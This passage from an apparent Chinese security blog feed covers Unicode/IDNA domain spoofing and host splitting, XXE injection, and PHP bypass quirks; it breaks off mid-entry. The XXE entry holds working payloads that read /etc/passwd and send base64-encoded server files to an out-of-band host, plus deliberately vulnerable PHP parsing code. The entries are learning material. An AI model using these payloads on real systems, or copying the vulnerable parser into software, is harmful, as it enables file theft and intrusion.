    <content type="html"><![CDATA[<h1 id="url中的unicode漏洞引发的域名安全问题"><a href="#url中的unicode漏洞引发的域名安全问题" class="headerlink" title="url中的unicode漏洞引发的域名安全问题"></a>url中的unicode漏洞引发的域名安全问题</h1><p>本文章首发于先知社区</p><p>在今年的blackhat中微软安全研究员Jonathan Birch，向大家介绍了一个unicode漏洞，此漏洞影响了现在的大部分的软件，语言，浏览器，产生了数个CVE漏洞。跟随着大佬大脚步，我也想去了解这个漏洞。为了记录自己的学习成果，于是写下了这篇博客。</p><h2 id="0x00基础知识"><a href="#0x00基础知识" class="headerlink" title="0x00基础知识"></a>0x00基础知识</h2><p>在理解漏洞之前，现了解下unicode和ascii编码，IDNA吧</p><h3 id="unicode编码"><a href="#unicode编码" class="headerlink" title="unicode编码"></a>unicode编码</h3><p>​        <strong>Unicode</strong>（中文：万国码、国际码、统一码、单一码）是计算机科学领域里的一项业界标准。它对世界上大部分的文字系统进行了整理、编码，使得计算机可以用更为简单的方式来呈现和处理文字。</p><p>​        Unicode 伴随着通用字符集的标准而发展，同时也以书本的形式对外发表。Unicode 至今仍在不断增修，每个新版本都加入更多新的字符。当前最新的版本为2019年5月公布的12.1.0，已经收录超过13万个字符（第十万个字符在2005年获采纳）。Unicode涵盖的数据除了视觉上的字形、编码方法、标准的字符编码外，还包含了字符特性，如大小写字母。</p><h2 id="ascii编码"><a href="#ascii编码" class="headerlink" title="ascii编码"></a>ascii编码</h2><p>​        ASCII（American Standard Code for Information Interchange，美国信息交换标准代码）是基于拉丁字母的一套电脑编码系统，它主要用于显示现代英语，而其扩展版本EASCII则可以部分支持其他西欧语言，并等同于国际标准ISO/IEC 646。</p><p>​        ASCII 由电报码发展而来。第一版标准发布于1963年，1967年经历了一次主要修订，最后一次更新则是在1986年，至今为止共定义了128个字符；其中33个字符无法显示（一些终端提供了扩展，使得这些字符可显示为诸如笑脸、扑克牌花式等8-bit符号），且这33个字符多数都已是陈废的控制字符。控制字符的用途主要是用来操控已经处理过的文字。在33个字符之外的是95个可显示的字符。用键盘敲下空白键所产生的空白字符也算1个可显示字符（显示为空白）。</p><p>​        ASCII码大致由三部分组成：<strong>ASCII 打印字符</strong>、<strong>ASCII 非打印控制字符</strong>、<strong>扩展 ASCII 打印字符</strong></p><h3 id="IDNA（Internationalizing-Domain-Names-in-Applications）应用程序国际化域名"><a href="#IDNA（Internationalizing-Domain-Names-in-Applications）应用程序国际化域名" class="headerlink" title="IDNA（Internationalizing Domain Names in Applications）应用程序国际化域名"></a>IDNA（Internationalizing Domain Names in Applications）应用程序国际化域名</h3><p>​        IDNA是一种以标准方式处理ASCII以外字符的一种机制，它从unicode中提取字符，并允许非ASCII码字符以允许使用的ASCII字符表示。</p><p>​        国际化域名(IDN)最初是由马丁·杜斯特于1996年12月提出。1998年在新加坡国立大学教授陈定炜的指导下，Tan Juay Kwang和Leong Kok Yong将其付诸实施。经过许多讨论和对比各种提案后，应用程序国际化域名（IDNA)被采纳为正式标准，并被用在许多顶级域名中。在IDNA中，“国际化域名”特指可以成功将IDNA转化为十进位制ASCII的域名。</p><h2 id="0x01漏洞分析"><a href="#0x01漏洞分析" class="headerlink" title="0x01漏洞分析"></a>0x01漏洞分析</h2><h3 id="1、域名欺骗"><a href="#1、域名欺骗" class="headerlink" title="1、域名欺骗"></a>1、域名欺骗</h3><p>​        先看一个有趣的东西，访问此网站<code>http://Вaidu.com</code>(其中的В是unicode U+0412)</p><p><img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="/2019/08/26/url%E4%B8%AD%E7%9A%84unicode%E6%BC%8F%E6%B4%9E/2.jpg" alt="2"></p><p>​        它是不是跳转到了<code>http://xn--aidu-f4d.com/</code>。</p><p><img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="/2019/08/26/url%E4%B8%AD%E7%9A%84unicode%E6%BC%8F%E6%B4%9E/3.jpg" alt="3"></p><p>当然，你也可以试试使用其他特殊的unicode编码。</p><p>​    下面，看下整个过程吧</p><p>​    先讲下跳转的url的含义</p><p><strong><a href="http://xn--aidu-f4d.com/" target="_blank" rel="noopener">http://xn--aidu-f4d.com/</a></strong></p><p><code>xn</code>:ACE(这是一个国际化域名编码)</p><p><code>aidu</code>:ASCII码</p><p><code>f4d</code>:状态机指令</p><p>​    现在，我们来看看具体过程</p><p><img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="/2019/08/26/url%E4%B8%AD%E7%9A%84unicode%E6%BC%8F%E6%B4%9E/1.jpg" alt="1"></p><p>​        当我们访问<code>http://Вaidu.com</code>时，浏览器会将我们访问的url交给域名系统(DNS)解析url为ip地址，在解析url的过程中采用递归查询和迭代查询，即先递归搜索浏览器自己的的dns缓存，然后搜索操作系统的dns缓存，接着搜索hosts文件缓存，搜索本地域名服务器，然后迭代搜索根域名服务器……，知道找到ip地址为止，找不到就返回404notfound，而在DNS中，国际化域名(IDNA)使用Punycode转写并以美国信息交换标准代码（ASCII）字符串储存。在本地DNS中，因为遇见特殊字符В，而无法将此url正常转化为ASCII，因此就直接在本地转化为<code>http://xn--aidu-f4d.com/</code>这种形式的url。</p><p>下面是burpsuite抓取的本地解析完成后的截图。</p><p><img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="/2019/08/26/url%E4%B8%AD%E7%9A%84unicode%E6%BC%8F%E6%B4%9E/4.jpg" alt="4"></p><hr><p><strong>而IDNA转写ASCII的过程又分为两步</strong></p><ol><li><p>Normalization</p><p>Convert characters to a “standardized form”.</p></li></ol><p>第一步：正常化，将字符转化为标准形式</p><p>例如：Å (U+00C5),Å (U+212B),Å (U+0041, U+030A)将会被标准化为å (U+00E5)</p><ol start="2"><li>Punycoding<br>Turn Unicode into ASCII.</li></ol><p>第二步：用punycode编码将unicode编码成ASCII码</p><p>​        现在我们已经知道，在我们访问域名<code>http://Вaidu.com</code>时，浏览器会将此unicode转化为ASCII码，然后访问<code>http://xn--aidu-f4d.com/</code>,如果我们注册了<code>http://xn--aidu-f4d.com/</code>这个域名，那么我们就可以将访问<code>http://Вaidu.com</code>的受害者转到这个域名下，从而实现钓鱼攻击。</p><hr><h3 id="2、域名分割"><a href="#2、域名分割" class="headerlink" title="2、域名分割"></a>2、域名分割</h3><p>​        如果你再尝试下访问<code>http://evil.c℀a.aaa.com</code></p><p><img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="/2019/08/26/url%E4%B8%AD%E7%9A%84unicode%E6%BC%8F%E6%B4%9E/5.jpg" alt="5"></p><p>​        这个时候你会发现你的浏览器会访问<code>http://evil.ca/ca.aaa.com</code>。</p><p><img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="/2019/08/26/url%E4%B8%AD%E7%9A%84unicode%E6%BC%8F%E6%B4%9E/6.jpg" alt="6"></p><p>​        在unicode中还有一种字符<code>℀</code>(U+2100)，当IDNA处理此字符时，会将<code>℀</code>变成a/c，因此当你访问此url时，dns服务器会自动将url重定向到另一个网站。如果服务器引用前端url时，只对域名做了限制，那么通过这种方法，我们就可以轻松绕过服务器对域名的限制了。</p><p><strong>但是为什么同样是unicode字符，但是会产生不同结果呢？</strong></p><p>​        首先我们要明确一点就是，IDNA并不是所有unicode都可以以ASCII码呈现的</p><p>​        unicode转ASCII发生在IDNA中的TOASCII操作中。如果能通过TOASCII转换时，将会以正常的字符呈现。而如果不能通过TOASCII转换时，就会使用“ACE标签”，“ACE”标签使输入的域名能转化为ASCII码。</p><p><strong>那还有其他可以利用的unicode字符吗？</strong></p><p>U+2100, <code>℀</code>      U+2101, <code>℁</code>        U+2105, <code>℅</code>    U+2106, <code>℆</code>    U+FF0F,<code>／</code>    U+2047, <code>⁇</code>    U+2048, <code>⁈</code>   U+2049, <code>⁉</code></p><p>U+FE16, <code>︖</code>     U+FE56, <code>﹖</code>   U+FF1F,<code>？</code>    U+FE5F, <code>﹟</code>    U+FF03, <code>＃</code>      U+FE6B, <code>﹫</code>    U+FF20, <code>＠</code></p><hr><h3 id="3、漏洞IDNA版本"><a href="#3、漏洞IDNA版本" class="headerlink" title="3、漏洞IDNA版本"></a>3、漏洞IDNA版本</h3><p><strong>IDNA2008</strong>阻断了分割域名的字符</p><p><strong>IDNA2003</strong> 和 <strong>IDNA2008 + UTS46</strong>存在漏洞</p><h2 id="0x03关联CVE"><a href="#0x03关联CVE" class="headerlink" title="0x03关联CVE"></a>0x03关联CVE</h2><p>• CVE-2019-0654 Microsoft Browser Spoofing Vulnerability</p><p>• CVE-2019-0657 .NET Framework and Visual Studio Spoofing Vulnerability</p><p>• CVE-2019-9636 Python, urlsplit does not handle NFKC normalization </p><p>• CVE-2019-10160 Python, urlsplit NFKD normalization vulnerability in user:password@</p><p>• CVE-2019-2816 Oracle Java SE/Java SE Embedded, “Normalize normalization”</p><p>• CVE-2019-12290 LibIDN2, “Perform A-Label roundtrip for lookup functions by default”</p><h2 id="0x04参考"><a href="#0x04参考" class="headerlink" title="0x04参考"></a>0x04参考</h2><p>此文章来源于对2019blackhat <code>HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization</code>议程的理解。</p><p><code>https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf</code></p><p><code>https://tools.ietf.org/html/rfc3490</code></p><p><code>https://zh.wikipedia.org/wiki/国际化域名</code></p><p><code>https://blog.csdn.net/kexiuyi/article/details/81125588</code></p><p><code>https://blog.csdn.net/qq_21993785/article/details/81188253</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;url中的unicode漏洞引发的域名安全问题&quot;&gt;&lt;a href=&quot;#url中的unicode漏洞引发的域名安全问题&quot; class=&quot;headerlink&quot; title=&quot;url中的unicode漏洞引发的域名安全问题&quot;&gt;&lt;/a&gt;url中的unicode漏洞引发的
      
    
    </summary>
    
    
    
      <category term="unicode" scheme="https://knightswd.github.io/tags/unicode/"/>
    
      <category term="web安全" scheme="https://knightswd.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>对xxe的理解</title>
    <link href="https://knightswd.github.io/2019/07/18/%E5%AF%B9xxe%E7%9A%84%E7%90%86%E8%A7%A3/"/>
    <id>https://knightswd.github.io/2019/07/18/%E5%AF%B9xxe%E7%9A%84%E7%90%86%E8%A7%A3/</id>
    <published>2019-07-18T07:17:54.000Z</published>
    <updated>2019-07-18T08:05:24.986Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、什么是xml"><a href="#一、什么是xml" class="headerlink" title="一、什么是xml"></a>一、什么是xml</h3><p><strong>可扩展标记语言</strong>（英语：E<strong>x</strong>tensible <strong>M</strong>arkup <strong>L</strong>anguage，简称：<strong>XML</strong>）是一种标记语言。标记指计算机所能理解的信息符号，通过此种标记，计算机之间可以处理包含各种信息的文章等。如何定义这些标记，既可以选择国际通用的标记语言，比如HTML，也可以使用像XML这样由相关人士自由决定的标记语言，这就是语言的可扩展性。XML是从标准通用标记语言（SGML）中简化修改出来的。它主要用到的有可扩展标记语言、可扩展样式语言（XSL）、XBRL和XPath等。                                                                                                                        —–维基百科</p><p>它主要是用于传送和携带数据信息，存储信息，这和json类似，但是结构相较于json更加复杂,解析时间相对较长</p><h3 id="二、什么是dtd"><a href="#二、什么是dtd" class="headerlink" title="二、什么是dtd"></a>二、什么是dtd</h3><p>xml的文档类型定义，由元素，属性，实体，注释组成，可以看成是一个或者多个xml模版。而我们后面的xxe则主要发生在dtd中。</p><h3 id="三、什么是xxe"><a href="#三、什么是xxe" class="headerlink" title="三、什么是xxe"></a>三、什么是xxe</h3><p>xxe全称为外部实体注入。xml中为了实现在文档中进行动态引入，方便在引用资源中做的更改能在文档中进行更新，因此产生了外部实体。外部实体注入，则是将它引用的目标文件更改成恶意url地址，从而达到读取任意文件的目的，甚至rce。<br>实体分为参数实体和通用实体，参数实体在被定义后只能在dtd中引用，参数实体的定义类似% 实体名<code>&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt;</code>。通用实体是在xml文档中被引用,引用方式是(&amp;实体名),定义方式<code>&lt;!ENTITY file SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt;</code></p><h3 id="四、xxe漏洞理解"><a href="#四、xxe漏洞理解" class="headerlink" title="四、xxe漏洞理解"></a>四、xxe漏洞理解</h3><h5 id="基本的xxe漏洞："><a href="#基本的xxe漏洞：" class="headerlink" title="基本的xxe漏洞："></a>基本的xxe漏洞：</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这是一个可以读取passwd的xml。<br>当这个xml传入后端</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$xml=file_get_contents(<span class="string">"php://input"</span>);</span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$dom=<span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xml,LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">$result=simplexml_import_dom($dom);</span><br><span class="line">print_r($result);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>经过php的xml解析器解析则会在浏览器中显示linux <code>/etc/passwd</code>中的文件内容了，通过此方法能读取任意文件，在读取时如果遇到类似&lt;&gt;等的特殊字符时会报xml解析错误，解决方法是使用<code>php://filter/read=convert.base64-encode/resource=file:///var/www/html/index.php</code>来对文件进行base64编码，当数据到达客户端时在解码，就可以拿到服务器上的数据了。</p><p>如果是java的后端服务器，并且可以使用jar协议，那么可能还会造成任意文件上传.</p><p>jar协议格式：<code>jar:{url}!{文件}</code></p><p>jar协议处理过程:</p><p>(1) 下载 jar/zip 文件到临时文件中</p><p>(2) 提取出我们指定的文件</p><p>(3) 删除临时文件。</p><p>通过jar协议下载恶意的代码到服务器，然后通过jar包含不存在的文件进行报错，找到下载文件的临时备份文件。</p><h5 id="blind-xxe"><a href="#blind-xxe" class="headerlink" title="blind xxe"></a>blind xxe</h5><p>xxe的盲注:<br>xxe盲注的思路：用参数实体获得服务器的文件，然后将文件用url传至ceye，来查看服务器的文件，在这个过程中将获取服务器文件的实体声明和发送文件的实体声明放在同一个文件中，则会报错，从而执行不成功。所以解决方法是，将上传服务器的实体声明放在一个xml文件中，然后通过xml中的实体声明访问dtd文件中发生至ceye的url。从而使文件内容随着url请求传入ceye。<br>xml.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$xml=file_get_contents(<span class="string">"php://input"</span>);</span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$dom=<span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xml,LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">$result=simplexml_import_dom($dom);</span><br><span class="line"><span class="comment">#print_r($result);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>xml.dtd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;http:&#x2F;&#x2F;ip?p&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/read=convert.base64-encode/resource=file:///var/www/html/a.txt"</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://127.0.0.1/xml.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote</span></span><br><span class="line"><span class="meta">%all</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="五、可能出现漏洞的点"><a href="#五、可能出现漏洞的点" class="headerlink" title="五、可能出现漏洞的点"></a>五、可能出现漏洞的点</h3><p>xxe可能出现在任何通过xml传输数据的地方，也有可能存在json传输的地方(将http头改成Content-Type: application/xml，然后在数据域中输入xxe的payload则能测试xxe)。</p><h3 id="六、xxe防御"><a href="#六、xxe防御" class="headerlink" title="六、xxe防御"></a>六、xxe防御</h3><p>通过libxml_disable_entity_loader(true);禁用php的外部实体。</p><p>黑名单过滤。</p><h3 id="七、爬过的坑"><a href="#七、爬过的坑" class="headerlink" title="七、爬过的坑"></a>七、爬过的坑</h3><p>在实验xxe盲注时，一直在报错，报错内容为<br><code>Entity: line 1: parser error : Invalid URI: http://ip.ceye.io/?p=aaaaaaa</code><br>在过了一天后，终于在一次尝试中成功了。<br>出问题的代码:<code>&lt;!ENTITY % file SYSTEM &quot;file:///var/www/html/a.txt&quot;&gt;</code><br>正确代码:<code>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///var/www/html/a.txt&quot;&gt;</code></p><p>猜测可能是因为有隐藏的xml无法解析的字符。</p><p>本地实验代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$xml=<span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="string">&lt;!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php"&gt;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;root&gt;&amp;file;&lt;/root&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$data = simplexml_load_string($xml, <span class="string">'SimpleXMLElement'</span>, LIBXML_NOENT);</span><br><span class="line"><span class="comment">#$b=simplexml_load_string($a);</span></span><br><span class="line"><span class="comment">#print_r($data);</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;一、什么是xml&quot;&gt;&lt;a href=&quot;#一、什么是xml&quot; class=&quot;headerlink&quot; title=&quot;一、什么是xml&quot;&gt;&lt;/a&gt;一、什么是xml&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;可扩展标记语言&lt;/strong&gt;（英语：E&lt;strong&gt;x&lt;/strong
      
    
    </summary>
    
    
    
      <category term="xxe" scheme="https://knightswd.github.io/tags/xxe/"/>
    
      <category term="漏洞复现" scheme="https://knightswd.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>php的理解</title>
    <link href="https://knightswd.github.io/2019/05/10/php%E7%9A%84%E7%90%86%E8%A7%A3/"/>
    <id>https://knightswd.github.io/2019/05/10/php%E7%9A%84%E7%90%86%E8%A7%A3/</id>
    <published>2019-05-10T09:25:24.000Z</published>
    <updated>2019-05-28T12:41:20.492Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0-00-php中的系统变量，全局可用"><a href="#0-00-php中的系统变量，全局可用" class="headerlink" title="0%00    php中的系统变量，全局可用"></a>0%00    php中的系统变量，全局可用</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$GLOBALS <span class="comment">// 引用全局作用域中可用的全部变量</span></span><br><span class="line">$_POST <span class="comment">// 获取 post 数据，是一个字典</span></span><br><span class="line">$_GET <span class="comment">// 获取 get 数据，是一个字典</span></span><br><span class="line">$_COOKIE <span class="comment">// 获取 cookie</span></span><br><span class="line">$_SESSION <span class="comment">// 获取 session</span></span><br><span class="line">$_FILES <span class="comment">// 获取上传的文件</span></span><br><span class="line">$_REQUEST <span class="comment">// 获取 $_GET，$_POST，$_COOKIE 中的数据</span></span><br><span class="line">$_ENV <span class="comment">// 环境变量</span></span><br><span class="line">$_SERVER <span class="comment">// 服务器和执行环境信息</span></span><br></pre></td></tr></table></figure><h2 id="0-01-php中双引号与单引号的区别"><a href="#0-01-php中双引号与单引号的区别" class="headerlink" title="0%01   php中双引号与单引号的区别"></a>0%01   php中双引号与单引号的区别</h2><p>双引号会输出变量，即使用服务器解析在双引号中的字符。</p><p>单引号将字符直接输出，不使用服务器解析，即使是\n也不解析。</p><p>php对单引号的解析速率比双引号快</p><h2 id="0-02-php中scandir（）函数可以看到目录下的所有文件名"><a href="#0-02-php中scandir（）函数可以看到目录下的所有文件名" class="headerlink" title="0%02   php中scandir（）函数可以看到目录下的所有文件名"></a>0%02   php中scandir（）函数可以看到目录下的所有文件名</h2><p>scandir(‘/‘).;</p><h2 id="0-03-php-变量覆盖"><a href="#0-03-php-变量覆盖" class="headerlink" title="0%03 php 变量覆盖"></a>0%03 php 变量覆盖</h2><p>第一种：<strong>$$造成的变量覆盖</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">$&#123;$key&#125; = $value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>返回值为输入的变量的值。</p><p>第二种<strong>extract() 函数从数组中将变量导入到当前的符号表</strong></p><p>extract()函数默认是覆盖已有变量</p><p>第三种<strong>parse_str()函数把查询字符串解析到变量中。</strong></p><p>第四种<strong>import_request_variables — 将 GET／POST／Cookie 变量导入到全局作用域中</strong></p><p>能从get,post,cookie三处传参。</p><p>unset($a)可以销毁一些变量。</p><h2 id="0-04输出文件内容"><a href="#0-04输出文件内容" class="headerlink" title="0%04输出文件内容"></a>0%04输出文件内容</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show_source(<span class="string">'flag.php'</span>);</span><br><span class="line">highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line">var_dump(file(<span class="string">'flag.php'</span>));</span><br><span class="line">print_r(file(<span class="string">'flag.php'</span>));</span><br></pre></td></tr></table></figure><p>对于php文件，输出文件内容中，<code>show_source()</code>,和<code>hightlight_file()</code>均是输出源php格式。而<code>var_dump()</code>是以数组的形式输出数据，数组[0]代表第一行，以此类推。<code>print_r()</code>也以数组的形式输出。但是对于html，<code>var_dump</code>输出的是html代码，而<code>print_r</code>输出的html会被前端浏览器执行。(这四个函数都可以通过<code>../</code>,<code>/</code>,查看目录下的文件)</p><h2 id="0-05文件读取"><a href="#0-05文件读取" class="headerlink" title="0%05文件读取"></a>0%05文件读取</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a&#x3D;file_get_contents(&#39;http:&#x2F;&#x2F;www.baidu.com&#39;);</span><br><span class="line">print_r($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>得到的将会是一个百度的界面。</p><h2 id="0-06-get和-post"><a href="#0-06-get和-post" class="headerlink" title="0%06$_get和$_post"></a>0%06$_get和$_post</h2><p>当向$_get和$_post传入数据name[]=a时，会自动将name转化为数组型且0=&gt;a，正常传入的数据是string型的。</p><h2 id="0-07strcmp-和-strcasecmp"><a href="#0-07strcmp-和-strcasecmp" class="headerlink" title="0%07strcmp 和 strcasecmp"></a>0%07strcmp 和 strcasecmp</h2><p>在这两个函数中数组和字符串比较均会返回NULL。</p><h2 id="0-08-parse-url-函数解析错误"><a href="#0-08-parse-url-函数解析错误" class="headerlink" title="0%08 parse_url()函数解析错误"></a>0%08 parse_url()函数解析错误</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=$_GET[<span class="string">'url'</span>];</span><br><span class="line">var_dump(parse_url($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>当输入<code>url=baidu.com/about:80</code>时会返回数组型<code>host=baidu.com</code>,<code>port=80</code>,<code>path=/about:80/</code>。</p><h2 id="0-09php弱类型比较"><a href="#0-09php弱类型比较" class="headerlink" title="0%09php弱类型比较"></a>0%09php弱类型比较</h2><p>目前还存在的弱类型(我的php版本7.2.11)有<code>0==&#39;addafs&#39;</code>返回<code>true</code>；<code>&#39;0.9999&#39;==1</code>返回<code>true</code></p><h2 id="0-10字符型和数值型的转换"><a href="#0-10字符型和数值型的转换" class="headerlink" title="0%10字符型和数值型的转换"></a>0%10字符型和数值型的转换</h2><p>当 <code>$var</code> 是一个字符串的时候，访问 <code>$var[&quot;any string&quot;]</code> 跟访问 <code>$var[intval(&quot;any string&quot;)]</code> 效果是一样的。当输入两个不一样的any string时，即<code>$var[&quot;aaa&quot;]==$var[&quot;bbb&quot;]=$var[0]</code>。</p><p>当进行switch()时，会将switch中的字符型数据转换为数值型，然后再到case中进行比较。</p><h2 id="0-11preg-match-正则表达式"><a href="#0-11preg-match-正则表达式" class="headerlink" title="0%11preg_match()正则表达式"></a>0%11preg_match()正则表达式</h2><p><code>preg_match()</code>在第一次匹配后将会停止搜索,因此如果正则表达式没有用<code>^</code>,<code>$</code>就有可能存在绕过，而且它的默认匹配方式为贪婪匹配，匹配尽可能多的字符。如果此函数开启了/m则也可能存在绕过，例如<code>/^[a-zA-Z0-9-s_]+.rpt$/m</code>如果要绕过这个限制只需要用a.rpt%0axxxx就可以执行后面的xxxx了。</p><p>开启/m后，<code>^</code>表示行首，<code>$</code>表示行尾</p><p>关闭/m后，<code>^</code>表示字符串的开始，<code>$</code>表示字符串的结尾</p><p>修饰符说明：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">i 在和正则匹配是不区分大小写 </span><br><span class="line">m 将字符串视为多行。默认的正则开始“^”和结束“$”将目标字条串作为一单一的一“行”字符（甚至其中包括换行符也是如此）。如果在修饰符中加上“m”，那么开始和结束将会指点字符串的每一行的开头就是“^”结束就是“$”。 </span><br><span class="line">o 评估表达式只有一次</span><br><span class="line">s 如果设定了这个修正符，那么，被匹配的字符串将视为一行来看，包括换行符，换行符将被视为普通字符串。 </span><br><span class="line">x 忽略空白，除非进行转义的不被忽略。 </span><br><span class="line">g 在全局范围内找到所有匹配</span><br><span class="line">cg 